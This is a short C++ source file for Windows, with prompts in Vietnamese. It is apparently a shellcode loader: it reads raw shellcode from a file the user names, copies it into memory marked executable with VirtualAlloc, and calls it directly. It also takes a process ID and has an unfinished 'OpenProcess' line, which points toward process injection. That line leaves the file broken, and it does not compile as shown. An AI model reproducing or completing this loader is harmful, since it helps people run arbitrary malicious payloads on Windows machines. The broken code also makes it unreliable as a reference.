#include <windows.h>
#include <fstream>
#include <iostream>
#include <string>
#include <vector>

using namespace std;

int main(int argc, char* argv[]) {
    if(argc<2){
        cout<<"Please type a parameter";
    }
    else{
        int PID = atoi(argv[1]);
    }
    HANDLE hProc = Open
    string file_name;
    wcout << L"[+] Nhap ten file shellcode: ";
    cin >> file_name;

    ifstream InputBin(file_name, ios::binary | ios::ate);
    if (!InputBin) {
        wcerr << L"[-] Loi: Khong mo duoc file!" << endl;
        return 1;
    }

    streamsize file_size = InputBin.tellg();
    if (file_size <= 0) {
        wcerr <<L"[-] Loi: File rong hoac loi khi lay kich thuoc!" << endl;
        return 1;
    }

    InputBin.seekg(0, ios::beg); // Quay lại đầu file để đọc
    vector<unsigned char> cache(file_size);

    if (!InputBin.read((char*)cache.data(), file_size)) {
        wcerr << L"[-] Loi: Doc file that bai!" << endl;
        return 1;
    }
    InputBin.close();

    void* exec = VirtualAlloc(NULL, file_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!exec) {
        wcerr << L"[-] Loi: Cap phat bo nho that bai!" << endl;
        return 1;
    }

    memcpy(exec, cache.data(), file_size);

    wcout << L"[+] Dang thuc thi shellcode..." << endl;
    ((void(*)())exec)();  // Gọi shellcode như 1 hàm

    return 0;
}
